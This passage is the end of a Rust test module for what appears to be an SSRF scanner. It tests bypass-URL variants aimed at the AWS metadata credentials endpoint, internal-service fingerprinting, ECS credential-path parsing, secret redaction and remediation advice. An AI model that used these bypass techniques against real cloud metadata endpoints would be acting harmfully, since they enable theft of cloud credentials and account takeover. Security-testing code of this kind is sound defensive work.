        assert!(parse_iam_roles("role with spaces").is_empty());
    }

    #[test]
    fn secret_redaction_never_leaks_full_secret() {
        let body = r#"{"Code":"Success","AccessKeyId":"ASIAEXAMPLEKEY12345","SecretAccessKey":"abc/def+ghi","Token":"AAA"}"#;
        let r = redact_secrets(body);
        assert!(r
            .iter()
            .any(|s| s.contains("ASIA") && s.contains("redacted")));
        assert!(r.iter().any(|s| s.contains("secret access key")));
        // The raw secret value must never appear in the redacted descriptors.
        assert!(!r.iter().any(|s| s.contains("abc/def+ghi")));
        assert!(redact_secrets("just a normal page").is_empty());

        let tok = redact_secrets(
            r#"{"access_token":"ya29.aVeryLongOauthTokenValue123456","expires_in":3599}"#, // nosemgrep
        );
        assert!(tok.iter().any(|s| s.contains("access_token")));
    }

    #[test]
    fn filter_bypass_variants_cover_common_wrappers() {
        let url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/";
        let v = filter_bypass_variants(url);
        assert!(v.len() >= 4, "expected multiple bypass wrappers");
        assert!(v.iter().any(|(u, _)| u.contains('@')));
        assert!(v.iter().any(|(u, _)| u.contains('#')));
        assert!(v
            .iter()
            .any(|(u, _)| u.contains("%2e") || u.contains("169.254.169.254")));
    }

    #[test]
    fn remediation_text_is_actionable() {
        assert!(remediation_for("credential_extraction", "aws").contains("IMDSv2"));
        assert!(remediation_for("file_read", "scheme").contains("file://"));
        assert!(remediation_for("imdsv2_posture", "aws").contains("169.254"));
    }

    #[test]
    fn sink_paths_auto_appended_at_depth_2() {
        let s = parse_settings(&cfg(json!({"intensity": "normal"})));
        assert!(s
            .extra_points
            .iter()
            .any(|p| p.contains("/api/fetch") || p.contains("/proxy")));
    }

    #[test]
    fn attack_paths_require_real_signals() {
        assert!(attack_paths(&Posture::default(), "x.test").is_empty());
        let mut p = Posture::default();
        p.metadata_confirmed = true;
        p.providers.insert("aws".into());
        let aps = attack_paths(&p, "x.test");
        assert!(aps.iter().any(|f| f["title"]
            .as_str()
            .unwrap_or("")
            .contains("Cloud Account Takeover")));
    }

    #[test]
    fn classify_internal_service_matches_real_banners() {
        let es = r#"{"cluster_name":"prod","tagline":"You Know, for Search"}"#;
        let (name, _, _) = classify_internal_service(es, "http://127.0.0.1:9200/").unwrap();
        assert_eq!(name, "Elasticsearch");

        let jenkins = "<html><title>Dashboard [Jenkins]</title></html>";
        assert!(classify_internal_service(jenkins, "http://127.0.0.1:8080/").is_some());

        assert!(
            classify_internal_service("<html>generic page</html>", "http://127.0.0.1:9999/")
                .is_none()
        );
    }

    #[test]
    fn parse_ecs_credential_paths_handles_json_and_lines() {
        assert_eq!(
            parse_ecs_credential_paths(r#"["/v2/credentials/abc-123","/v2/credentials/def"]"#),
            vec![
                "/v2/credentials/abc-123".to_string(),
                "/v2/credentials/def".to_string()
            ]
        );
        assert_eq!(
            parse_ecs_credential_paths("task-role-1\ntask-role-2\n"),
            vec!["task-role-1".to_string(), "task-role-2".to_string()]
        );
    }

    #[test]
    fn graphql_endpoints_include_common_paths() {
        let eps = graphql_probe_endpoints("https://app.example.com/api/v1/users");
        assert!(eps.iter().any(|e| e.ends_with("/graphql")));
        assert!(eps.iter().any(|e| e.ends_with("/api/graphql")));
    }

    #[test]
    fn settings_graphql_multipart_toggles() {
        let s = parse_settings(&cfg(json!({
            "intensity": "aggressive",
            "check_graphql": false,
            "check_multipart": true,
            "check_redirect_chain": false
        })));
        assert!(!s.test_graphql);
        assert!(s.test_multipart);
        assert!(!s.redirect_metadata_chain);
    }

    #[tokio::test]
    async fn empty_target_errors() {
        let r = run_ssrf_advanced_result_ctx("", &EngineRunContext::default()).await;
        assert!(!r.success);
        // The legacy 1-arg entry point must also still work.
        let r2 = run_ssrf_advanced_result("").await;
        assert!(!r2.success);
    }
}
